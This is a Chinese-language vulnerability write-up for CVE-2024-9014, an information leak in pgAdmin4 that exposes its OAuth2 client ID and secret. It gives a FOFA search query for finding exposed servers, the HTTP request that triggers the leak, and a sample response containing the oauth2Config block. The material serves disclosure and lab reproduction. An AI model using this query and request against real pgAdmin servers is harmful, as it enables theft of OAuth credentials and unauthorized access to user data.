**漏洞名称**

pgAdmin4 OAuth2 client ID与secret敏感信息泄漏漏洞

**漏洞影响**

pgAdmin4 8.9-3.fc40

pgAdmin4 8.12-1.fc41

**漏洞描述**

pgAdmin4 是开源数据库 PostgreSQL 的图形管理工具。2024年互联网上披露 CVE-2024-9014 pgAdmin 4 OAuth2 client ID与secret敏感信息泄漏漏洞。攻击者可构造恶意请求获取客户端ID和密钥，从而导致未经授权访问其他用户数据。官方已发布安全更新，建议升级至最新版本。

**FOFA搜索语句**

```
icon_hash="1502815117"
```

**漏洞复现**

向靶场发送如下数据包

```yaml
GET /login?next=/ HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27
Connection: close
Accept-Encoding: gzip


```

返回包

```yaml
      <div class="pg-sp-icon"></div>
    </div>
</div>
<script type="application/javascript">
            try {
    require(
        ['security.pages'],
        function() {
            window.renderSecurityPage('login_user', {"authSources": ["internal"], "authSourcesEnum": {"KERBEROS": "kerberos", "OAUTH2": "oauth2"}, "csrfToken": "IjI0N2M5M2RkZTVjZjM5ZDMzODU0NzA0OWY0NzllZTc3Y2ZjNjZiZGQi.ZwSbMw.o9ZNl6DQA_EJ1MpN7w0J5t8CIRM", "forgotPassUrl": "/browser/reset_password", "langOptions": [{"label": "English", "value": "en"}, {"label": "Chinese (Simplified)", "value": "zh"}, {"label": "Czech", "value": "cs"}, {"label": "French", "value": "fr"}, {"label": "German", "value": "de"}, {"label": "Indonesian", "value": "id"}, {"label": "Italian", "value": "it"}, {"label": "Japanese", "value": "ja"}, {"label": "Korean", "value": "ko"}, {"label": "Polish", "value": "pl"}, {"label": "Portuguese (Brazilian)", "value": "pt_BR"}, {"label": "Russian", "value": "ru"}, {"label": "Spanish", "value": "es"}], "loginBanner": "", "loginUrl": "/authenticate/login", "oauth2Config": [{"OAUTH2_ADDITIONAL_CLAIMS": null, "OAUTH2_API_BASE_URL": null, "OAUTH2_AUTHORIZATION_URL": null, "OAUTH2_BUTTON_COLOR": null, "OAUTH2_CLIENT_ID": null, "OAUTH2_CLIENT_SECRET": null, "OAUTH2_DISPLAY_NAME": "\u003cOauth2 Display Name\u003e", "OAUTH2_ICON": null, "OAUTH2_LOGOUT_URL": null, "OAUTH2_NAME": null, "OAUTH2_SCOPE": null, "OAUTH2_SERVER_METADATA_URL": null, "OAUTH2_SSL_CERT_VERIFICATION": true, "OAUTH2_TOKEN_URL": null, "OAUTH2_USERINFO_ENDPOINT": null, "OAUTH2_USERNAME_CLAIM": null}], "userLanguage": "en"},
                {"messages": []});
        }, function() {
            console.log(arguments);
        }
    );
} catch (err) {
    console.log(err);
}
</script>

</body>
</html>
```

